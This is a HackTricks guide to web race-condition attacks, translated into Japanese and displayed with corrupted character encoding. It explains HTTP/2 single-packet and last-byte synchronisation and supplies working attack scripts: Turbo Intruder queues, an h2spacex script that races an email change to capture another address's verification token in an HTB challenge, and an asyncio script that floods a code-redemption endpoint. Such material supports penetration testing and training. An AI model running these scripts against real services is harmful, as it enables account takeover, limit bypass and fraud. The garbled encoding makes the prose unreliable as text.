# ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸ**ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰ã—ã€è‡ªå‹•åŒ–**ã—ã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

{% hint style="warning" %}
ã“ã®æŠ€è¡“ã‚’æ·±ãç†è§£ã™ã‚‹ã«ã¯ã€[https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)ã®å…ƒã®ãƒ¬ãƒãƒ¼ãƒˆã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
{% endhint %}

## ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³æ”»æ’ƒã®å¼·åŒ–

ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨ã™ã‚‹éš›ã®ä¸»ãªéšœå®³ã¯ã€**å‡¦ç†æ™‚é–“ã«ã»ã¨ã‚“ã©å·®ãŒãªã„çŠ¶æ…‹ã§ã€è¤‡æ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒåŒæ™‚ã«å‡¦ç†ã•ã‚Œã‚‹ã“ã¨ã‚’ç¢ºå®Ÿã«ã™ã‚‹ã“ã¨â€”ç†æƒ³çš„ã«ã¯1msæœªæº€**ã§ã™ã€‚

ã“ã“ã§ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’åŒæœŸã•ã›ã‚‹ãŸã‚ã®ã„ãã¤ã‹ã®æŠ€è¡“ã‚’ç´¹ä»‹ã—ã¾ã™ï¼š

#### HTTP/2ã‚·ãƒ³ã‚°ãƒ«ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒå¯¾HTTP/1.1ãƒ©ã‚¹ãƒˆãƒã‚¤ãƒˆåŒæœŸ

* **HTTP/2**ï¼šå˜ä¸€ã®TCPæ¥ç¶šã‚’ä»‹ã—ã¦2ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã‚’ã‚µãƒãƒ¼ãƒˆã—ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã®ã‚¸ãƒƒã‚¿ãƒ¼ã®å½±éŸ¿ã‚’è»½æ¸›ã—ã¾ã™ã€‚ãŸã ã—ã€ã‚µãƒ¼ãƒãƒ¼å´ã®å¤‰å‹•ã«ã‚ˆã‚Šã€2ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã¯ä¸€è²«ã—ãŸãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã®æ‚ªç”¨ã«ã¯ä¸ååˆ†ãªå ´åˆãŒã‚ã‚Šã¾ã™ã€‚
* **HTTP/1.1 'ãƒ©ã‚¹ãƒˆãƒã‚¤ãƒˆåŒæœŸ'**ï¼š20-30ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã»ã¨ã‚“ã©ã®éƒ¨åˆ†ã‚’äº‹å‰ã«é€ä¿¡ã—ã€å°ã•ãªæ–­ç‰‡ã‚’ä¿æŒã—ã€ãã‚Œã‚’ä¸€ç·’ã«é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€ã‚µãƒ¼ãƒãƒ¼ã¸ã®åŒæ™‚åˆ°ç€ã‚’å®Ÿç¾ã—ã¾ã™ã€‚

**ãƒ©ã‚¹ãƒˆãƒã‚¤ãƒˆåŒæœŸã®æº–å‚™**ã«ã¯ä»¥ä¸‹ãŒå«ã¾ã‚Œã¾ã™ï¼š

1. ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’çµ‚äº†ã›ãšã«æœ€çµ‚ãƒã‚¤ãƒˆã‚’é™¤ã„ãŸãƒ˜ãƒƒãƒ€ãƒ¼ã¨ãƒœãƒ‡ã‚£ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã—ã¾ã™ã€‚
2. åˆå›é€ä¿¡å¾Œã«100mså¾…æ©Ÿã—ã¾ã™ã€‚
3. TCP\_NODELAYã‚’ç„¡åŠ¹ã«ã—ã¦ã€Nagleã®ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã‚’åˆ©ç”¨ã—ã¦æœ€çµ‚ãƒ•ãƒ¬ãƒ¼ãƒ ã‚’ãƒãƒƒãƒå‡¦ç†ã—ã¾ã™ã€‚
4. æ¥ç¶šã‚’æ¸©ã‚ã‚‹ãŸã‚ã«ãƒ”ãƒ³ã‚°ã‚’é€ä¿¡ã—ã¾ã™ã€‚

ä¿æŒã•ã‚ŒãŸãƒ•ãƒ¬ãƒ¼ãƒ ã®ãã®å¾Œã®é€ä¿¡ã¯ã€Wiresharkã‚’ä»‹ã—ã¦ç¢ºèªã§ãã‚‹å˜ä¸€ãƒ‘ã‚±ãƒƒãƒˆã§ã®åˆ°ç€ã‚’ã‚‚ãŸã‚‰ã™ã¹ãã§ã™ã€‚ã“ã®æ–¹æ³•ã¯ã€é€šå¸¸RCæ”»æ’ƒã«é–¢ä¸ã—ãªã„é™çš„ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯é©ç”¨ã•ã‚Œã¾ã›ã‚“ã€‚

### ã‚µãƒ¼ãƒãƒ¼ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¸ã®é©å¿œ

ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã‚’ç†è§£ã™ã‚‹ã“ã¨ã¯é‡è¦ã§ã™ã€‚ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã‚µãƒ¼ãƒãƒ¼ã¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ç•°ãªã‚‹æ–¹æ³•ã§ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ã€‚ç„¡é–¢ä¿‚ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€šã˜ã¦ã‚µãƒ¼ãƒãƒ¼å´ã®æ¥ç¶šã‚’äº‹å‰ã«æ¸©ã‚ã‚‹ã“ã¨ã§ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã‚’æ­£è¦åŒ–ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

#### ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒ™ãƒ¼ã‚¹ã®ãƒ­ãƒƒã‚¯ã®å‡¦ç†

PHPã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã®ã‚ˆã†ãªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³ã”ã¨ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã€è„†å¼±æ€§ã‚’éš ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚å„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ç•°ãªã‚‹ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ã“ã®å•é¡Œã‚’å›é¿ã§ãã¾ã™ã€‚

#### ãƒ¬ãƒ¼ãƒˆã¾ãŸã¯ãƒªã‚½ãƒ¼ã‚¹åˆ¶é™ã®å…‹æœ

æ¥ç¶šã®æ¸©ã‚ãŒåŠ¹æœçš„ã§ãªã„å ´åˆã€ãƒ€ãƒŸãƒ¼ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æ´ªæ°´ã‚’é€šã˜ã¦ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã®ãƒ¬ãƒ¼ãƒˆã¾ãŸã¯ãƒªã‚½ãƒ¼ã‚¹åˆ¶é™ã®é…å»¶ã‚’æ„å›³çš„ã«å¼•ãèµ·ã“ã™ã“ã¨ã§ã€ãƒ¬ãƒ¼ã‚¹ã‚³ãƒ³ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ã«é©ã—ãŸã‚µãƒ¼ãƒãƒ¼å´ã®é…å»¶ã‚’èª˜ç™ºã—ã€ã‚·ãƒ³ã‚°ãƒ«ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒã‚’ä¿ƒé€²ã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## æ”»æ’ƒã®ä¾‹

* **Tubo Intruder - HTTP2ã‚·ãƒ³ã‚°ãƒ«ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒï¼ˆ1ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼‰**ï¼šãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’**Turbo intruder**ã«é€ä¿¡ã§ãã¾ã™ï¼ˆ`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`ï¼‰ã€‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã®**`%s`**ã®å€¤ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ãŸã„ã‚‚ã®ã«å¤‰æ›´ã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€`csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`ã®ã‚ˆã†ã«ã€‚ãã—ã¦ã€ãƒ‰ãƒ­ãƒƒãƒ—ãƒ€ã‚¦ãƒ³ã‹ã‚‰**`examples/race-single-packer-attack.py`**ã‚’é¸æŠã—ã¾ã™ï¼š

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

ç•°ãªã‚‹å€¤ã‚’**é€ä¿¡ã™ã‚‹**å ´åˆã¯ã€ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‹ã‚‰ã®ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã®ã‚³ãƒ¼ãƒ‰ã§å¤‰æ›´ã§ãã¾ã™ï¼š
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
ã‚¦ã‚§ãƒ–ãŒHTTP2ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„å ´åˆï¼ˆHTTP1.1ã®ã¿ï¼‰ã€`Engine.BURP2`ã®ä»£ã‚ã‚Šã«`Engine.THREADED`ã¾ãŸã¯`Engine.BURP`ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

* **Tubo Intruder - HTTP2ã‚·ãƒ³ã‚°ãƒ«ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒï¼ˆè¤‡æ•°ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆï¼‰**: 1ã¤ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€ãã®å¾ŒRCEã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ãŸã‚ã«ä»–ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«è¤‡æ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€`race-single-packet-attack.py`ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ¬¡ã®ã‚ˆã†ã«å¤‰æ›´ã§ãã¾ã™:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* **Repeater**ã§ã‚‚ã€Burp Suiteã®æ–°ã—ã„ã€Œ**Send group in parallel**ã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚
* **limit-overrun**ã®å ´åˆã€ã‚°ãƒ«ãƒ¼ãƒ—ã«**åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’50å›**è¿½åŠ ã™ã‚‹ã ã‘ã§æ¸ˆã¿ã¾ã™ã€‚
* **connection warming**ã®ãŸã‚ã«ã€**ã‚°ãƒ«ãƒ¼ãƒ—**ã®**æœ€åˆ**ã«ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã®éé™çš„éƒ¨åˆ†ã¸ã®**ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’**è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **é…å»¶**ã‚’**1ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨åˆ¥ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å‡¦ç†ã®é–“**ã«2ã¤ã®ã‚µãƒ–ã‚¹ãƒ†ãƒ¼ãƒˆã‚¹ãƒ†ãƒƒãƒ—ã§è¡Œã†ã«ã¯ã€ä¸¡æ–¹ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é–“ã«**è¿½åŠ ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **multi-endpoint** RCã®å ´åˆã€**éš ã‚ŒãŸçŠ¶æ…‹**ã«é€ä¿¡ã•ã‚Œã‚‹**ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’æœ€åˆã«é€ä¿¡ã—ã€ãã®å¾Œã«**éš ã‚ŒãŸçŠ¶æ…‹ã‚’æ‚ªç”¨ã™ã‚‹50ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **è‡ªå‹•åŒ–ã•ã‚ŒãŸPythonã‚¹ã‚¯ãƒªãƒ—ãƒˆ**: ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ç›®çš„ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚’å¤‰æ›´ã—ã€æ–°ã—ã„ãƒ¡ãƒ¼ãƒ«ã®æ¤œè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ãŒæœ€å¾Œã®ãƒ¡ãƒ¼ãƒ«ã«å±Šãã¾ã§ç¶™ç¶šçš„ã«ç¢ºèªã™ã‚‹ã“ã¨ã§ã™ï¼ˆã“ã‚Œã¯ã€ã‚³ãƒ¼ãƒ‰å†…ã§ãƒ¡ãƒ¼ãƒ«ã‚’å¤‰æ›´ã§ãã‚‹RCãŒè¦‹ã‚‰ã‚ŒãŸãŸã‚ã§ã€æ¤œè¨¼ãŒå¤ã„ãƒ¡ãƒ¼ãƒ«ã«é€ä¿¡ã•ã‚Œã‚‹ã“ã¨ãŒå¯èƒ½ã§ã—ãŸã€‚ãªãœãªã‚‰ã€ãƒ¡ãƒ¼ãƒ«ã‚’ç¤ºã™å¤‰æ•°ãŒæœ€åˆã®ã‚‚ã®ã§æ—¢ã« populated ã•ã‚Œã¦ã„ãŸã‹ã‚‰ã§ã™ï¼‰ã€‚\
ã€Œobjetivoã€ã¨ã„ã†å˜èªãŒå—ä¿¡ã—ãŸãƒ¡ãƒ¼ãƒ«ã«è¦‹ã¤ã‹ã‚‹ã¨ã€å¤‰æ›´ã•ã‚ŒãŸãƒ¡ãƒ¼ãƒ«ã®æ¤œè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å—ã‘å–ã£ãŸã“ã¨ãŒã‚ã‹ã‚Šã€æ”»æ’ƒã‚’çµ‚äº†ã—ã¾ã™ã€‚
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### ã‚·ãƒ³ã‚°ãƒ«ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒã®æ”¹å–„

å…ƒã®ç ”ç©¶ã§ã¯ã€ã“ã®æ”»æ’ƒã«ã¯1,500ãƒã‚¤ãƒˆã®åˆ¶é™ãŒã‚ã‚‹ã¨èª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€[**ã“ã®æŠ•ç¨¿**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)ã§ã¯ã€IPãƒ¬ã‚¤ãƒ¤ãƒ¼ã®ãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã‚·ãƒ³ã‚°ãƒ«ãƒ‘ã‚±ãƒƒãƒˆæ”»æ’ƒã®1,500ãƒã‚¤ãƒˆã®åˆ¶é™ã‚’**TCPã®65,535 Bã‚¦ã‚£ãƒ³ãƒ‰ã‚¦åˆ¶é™ã«æ‹¡å¼µã™ã‚‹æ–¹æ³•**ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ï¼ˆå˜ä¸€ã®ãƒ‘ã‚±ãƒƒãƒˆã‚’è¤‡æ•°ã®IPãƒ‘ã‚±ãƒƒãƒˆã«åˆ†å‰²ã—ã€ç•°ãªã‚‹é †åºã§é€ä¿¡ã™ã‚‹ã“ã¨ã§ã€ã™ã¹ã¦ã®ãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆãŒã‚µãƒ¼ãƒãƒ¼ã«åˆ°é”ã™ã‚‹ã¾ã§ãƒ‘ã‚±ãƒƒãƒˆã®å†æ§‹æˆã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚ã“ã®æŠ€è¡“ã«ã‚ˆã‚Šã€ç ”ç©¶è€…ã¯ç´„166msã§10,000ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚&#x20;

ã“ã®æ”¹å–„ã«ã‚ˆã‚Šã€åŒæ™‚ã«åˆ°ç€ã™ã‚‹å¿…è¦ãŒã‚ã‚‹æ•°ç™¾ã¾ãŸã¯æ•°åƒã®ãƒ‘ã‚±ãƒƒãƒˆã‚’å¿…è¦ã¨ã™ã‚‹RCæ”»æ’ƒãŒã‚ˆã‚Šä¿¡é ¼æ€§ã®é«˜ã„ã‚‚ã®ã«ãªã‚Šã¾ã™ãŒã€ã„ãã¤ã‹ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢åˆ¶é™ãŒã‚ã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã™ã€‚Apacheã€Nginxã€Goãªã©ã®äººæ°—ã®ã‚ã‚‹HTTPã‚µãƒ¼ãƒãƒ¼ã«ã¯ã€`SETTINGS_MAX_CONCURRENT_STREAMS`ã®è¨­å®šãŒãã‚Œãã‚Œ100ã€128ã€250ã«å³æ ¼ã«åˆ¶é™ã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€NodeJSã‚„nghttp2ã®ã‚ˆã†ãªä»–ã®ã‚‚ã®ã¯ç„¡åˆ¶é™ã§ã™ã€‚\
ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€ApacheãŒå˜ä¸€ã®TCPæ¥ç¶šã‹ã‚‰100ã®HTTPæ¥ç¶šã®ã¿ã‚’è€ƒæ…®ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ï¼ˆã“ã®RCæ”»æ’ƒã‚’åˆ¶é™ã—ã¾ã™ï¼‰ã€‚

ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ãŸã„ãã¤ã‹ã®ä¾‹ã¯ã€ãƒªãƒã‚¸ãƒˆãƒª[https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ç”Ÿã®BF

å‰ã®ç ”ç©¶ã®å‰ã«ã€RCã‚’å¼•ãèµ·ã“ã™ãŸã‚ã«ãƒ‘ã‚±ãƒƒãƒˆã‚’ã§ãã‚‹ã ã‘æ—©ãé€ä¿¡ã—ã‚ˆã†ã¨ã—ãŸã„ãã¤ã‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒã‚ã‚Šã¾ã—ãŸã€‚

* **ãƒªãƒ”ãƒ¼ã‚¿ãƒ¼:** å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
* **ä¾µå…¥è€…**: **ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã‚’**ä¾µå…¥è€…**ã«é€ä¿¡ã—ã€**ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãƒ¡ãƒ‹ãƒ¥ãƒ¼**å†…ã§**ã‚¹ãƒ¬ãƒƒãƒ‰æ•°**ã‚’**30**ã«è¨­å®šã—ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¨ã—ã¦**ãƒŒãƒ«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã‚’é¸æŠã—ã€**30**ã‚’ç”Ÿæˆã—ã¾ã™ã€‚
* **ã‚¿ãƒ¼ãƒœä¾µå…¥è€…**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

